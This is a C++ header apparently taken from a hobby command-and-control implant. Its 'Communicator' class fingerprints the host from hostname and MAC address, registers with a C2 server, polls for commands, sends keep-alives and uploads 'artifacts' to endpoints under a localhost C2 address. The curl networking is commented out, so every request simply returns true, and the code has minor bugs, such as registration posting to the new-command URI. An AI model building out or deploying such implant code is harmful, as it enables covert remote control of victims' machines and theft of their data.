#pragma once

#include <iostream>
#include <string>
#include <mutex>
//#include "../include/curl"
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"

using json = nlohmann::json;


#define C2_HOST "http://127.0.0.1:1234"
#define REGISTER_URI C2_HOST"/c2/register"
#define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command"
#define KEEP_ALIVE_URI C2_HOST"/c2/ping"
#define SEND_ARTIFACT C2_HOST"/c2/send_artifact"

class Communicator
{
private:
    std::string client_id;
    // CURL * curl;
    std::mutex curl_mtx;

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

    bool send_request_safe(std::string uri, const json & payload, json * response_ptr, bool post=true)
    {
        /*std::lock_guard<std::mutex> lock(curl_mtx);
        std::string response_buf
        long resp_code;
        curl = curl_easy_init();
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        if (post)
        {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_slist_append(headers, "Content-Type: application/json");
            if(payload)
            {
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.dump().c_str());
            }
        }

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);
        
        res = curl_easy_perform(curl);
    
        if (res != CURLE_OK) 
        {
            std::cerr << "curl_easy_perform() failed " << curl_easy_strerror(res);
        }  
        else if (curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &resp_code) && resp_code == 200)
        {
            char * content_type;
            res = curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
            if ((res == CURLE_OK) && content_type && std::string(content_type).find("application/json") != std::string::npos)  
            {
                response_ptr->parse(response_buf);
            }
            else
            {
                std::cout << "response buffer: " << response_buf << std::endl;
            }
        }
        else
        {
            std::cerr << "Unsuccessfull HTTP Response Code" << std::endl;
        }

        curl_easy_cleanup(curl);

        return response_buf.size() || resp_code == 200;
        
        */

       return true;
    }
    
    void keep_alive()
    {
        json payload_client_id;
        json response;
        payload_client_id["client_id"] = client_id;
        send_request_safe(KEEP_ALIVE_URI, payload_client_id, &response);
    }

    Communicator() {
        if (!init())
        {
            throw std::runtime_error("Can't init communicator");
        }
    }

    void generate_agent_id()
    {
	    std::string hostname = MachineUtils::get_host_name();
        std::string macaddr = MachineUtils::get_mac_address();
        std::stringstream ss(hostname);
        ss << "-" << macaddr;
        client_id = CryptoUtils::md5(ss.str());
    }

    bool init()
    {
        generate_agent_id();
        return true;//curl_global_init(CURL_GLOBAL_DEFAULT);

    }

public:
    
    static Communicator& getInstance() {
        static Communicator instance;
        return instance;
    }
    
    Communicator(const Communicator&) = delete;
    Communicator& operator=(const Communicator&) = delete;

    ~Communicator() {
        // curl_easy_cleanup();
        // curl_global_cleanup();
    }

    bool check_new_command(json * cmd)
    {
        return send_request_safe(CHECK_NEW_CMD_URI, NULL, cmd);
    }

    bool c2_registration()
    {
        json response;
        json registration_payload;
        registration_payload["client_id"] = client_id;
        return send_request_safe(CHECK_NEW_CMD_URI, registration_payload, &response) || response["status"] == 0;
    }

    void send_artifact(const json & payload)
    {
        json response;
        send_request_safe(SEND_ARTIFACT, payload, &response);
    }
};
